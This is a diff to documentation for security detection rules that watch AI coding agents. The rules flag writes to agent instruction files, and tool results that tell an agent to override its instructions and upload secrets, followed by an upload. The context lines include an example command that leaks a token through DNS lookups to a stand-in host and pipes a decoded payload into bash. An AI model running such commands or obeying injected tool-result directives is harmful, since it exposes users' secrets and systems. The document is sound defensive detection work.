@@ -137,3 +137,36 @@ Example synthetic command:
 ```text
 bash -lc 'printf SYNTHETIC_TOKEN | base64 --encode | xargs -I{} nslookup {}.example.invalid; echo U1lOVEhFVElDX1BBWUxPQUQ= | base64 --decode | bash'
 ```
+
+## Agent Instruction Write Hunt
+
+`persistence.agent_instruction_write` reports a native file-tool write to an
+`AGENTS.md` or `CLAUDE.md` file, or to a `.agents/skills/` or `.claude/skills/`
+`SKILL.md` entrypoint. Its 40 points and `hunt` intent make the change visible
+without asserting that ordinary project maintenance is malicious. Reads and
+path mentions are negative cases. Shell writes and changes to supporting skill
+files are outside this rule. The initial native-source efficacy case is Codex;
+it does not qualify the other sources.
+
+Analysts should check who requested the edit, the diff, and whether later agent
+actions followed new instructions. The synthetic authorized write and read
+cases are `BC-AGENT-INSTRUCTION-WRITE-001` and
+`BC-AGENT-INSTRUCTION-READ-001` in the evaluation corpus.
+
+## Non-MCP Tool-Result Directive Followed by Upload
+
+`prompt_injection.tool_result_egress_directive` is a zero-point hunt for a tool
+result that tells the agent to override prior instructions and transfer secrets.
+`chain.tool_result_egress_directive_then_upload` adds 15 points when
+`exfil.outbound_upload` follows within two tool calls. The synthetic Codex
+attack `RX-TOOL-RESULT-UPLOAD-001` scores 75 and requires security review;
+`BC-TOOL-RESULT-QUOTE-001` quotes the same kind of instruction in documentation
+before an approved artifact upload and stays below that threshold.
+
+The match is a bounded text heuristic and an upload command is an attempted
+action, not proof of completed transfer. A malicious result can avoid the
+phrases; a quoted example without the recognized documentation markers may
+still need analyst triage. Review the source of the result, the user request,
+the upload destination, and the action outcome. The synthetic fixture verifies
+Codex acquisition and Event 3 output only; no broad live-source efficacy claim
+is made.
